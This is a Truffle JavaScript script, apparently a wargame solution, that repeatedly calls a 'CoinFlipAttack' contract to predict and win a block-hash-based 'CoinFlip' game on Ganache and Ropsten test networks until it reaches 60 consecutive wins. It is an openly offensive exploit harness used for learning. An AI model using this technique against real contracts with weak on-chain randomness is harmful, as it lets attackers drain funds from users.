module.exports = function (callback) {
    const CoinFlipAttack = artifacts.require("CoinFlipAttack");
    const CoinFlip = artifacts.require("CoinFlip");
    //  let own = "0xbBa4c28CF2e98c454314E25EE02F8f900e10B75F";
    // let atk = "0xf7926a437Ad0412bb1e4cD950EfA65a123b3E0f1";
    //let account_three = "0x60830581AB24E44C3577e1614604EB23c70E5ef5";
    let FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    let meta;
    //ropsten
    //let attacker_address = "0x30c947301d4344091fac586c5dd1dba97385f5bb"
    //ganache
    let attacker_address = "0x900a66Bcfb7F99592d9d1D022F16513595BC57B7"

    function transact(contractFunction, params) {
        CoinFlip.deployed().then(function (instance) {
            meta = instance;
            return meta[contractFunction](...params);
        }).then(function (result) {
            console.log(result);
        }).catch(function (e) {
            console.log("error: " + e);
            //error
        })
    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms)
        })
    }
    async function guess() {
        let blockHash;
        let blockNumber;
        await web3.eth.getBlockNumber(function (error, result) {
            blockNumber = result;
        })
        let lastBlock = 0;
        let coin_side = false;
        let instance = await CoinFlipAttack.deployed();
        //ganache
        let vulnerable = instance;
        //let vulnerable = await CoinFlip.at("0x16f64cd939006ec899f50c6aa559ec5f29f1ccbb");
        //ropsten
        //let vulnerable = await CoinFlip.at("0xd780f39c1bc867e35825e9a63d23a17072d7030d");
        let wins = await instance["consecutiveWins"]({
            from: attacker_address

        });
        while (wins < 60) {

            /* contract_bv = await instance["bv2"]({
                from: attacker_address
            });
            console.log("BH-2 contract base10?: " + contract_bv);

            contract_bv = await instance["bv1"]({
                from: attacker_address
            });
            console.log("BH-1 contract base10?: " + contract_bv); */

            contract_side = await instance["side"]({
                from: attacker_address
            });
            console.log("\nguessing from side: " + contract_side);
            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })
            console.log("Block we got side: " + blockNumber);
            /* await transact("flip", [contract_side,{
                from: attacker_address
            }]); */
            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })
            console.log("Block submitted: " + blockNumber);
            let flip_result = await vulnerable["flip"](contract_side,{
                from: attacker_address
            });
            console.log(flip_result);
            /* vulnerable["flip"](contract_side,{
                from: attacker_address
            }); */
         /*    CoinFlip.deployed().then(function (instance) {
                meta = instance;
                return meta[contractFunction](...params);
            }).then(function (result) {
                console.log(result);
            }).catch(function (e) {
                console.log("error: " + e);
                //error
            }) */
            //console.log(flip_result);
            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })
            console.log("Block resolved: " + blockNumber);
            lastBlock = blockNumber;

            wins = await vulnerable["consecutiveWins"]({
                from: attacker_address
            });

            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })

            console.log("wins: " + wins);
            console.log("Block Number: " + blockNumber);
            //await sleep(2000);

            //This is where we wait for the next block before making a new transaction
            /* console.log("Waiting for next block");
             while (lastBlock == blockNumber) {
                 await web3.eth.getBlockNumber(function (error, result) {
                     blockNumber = result;
                 })
                 await sleep(100);
             } */
        }
    }
    guess();
}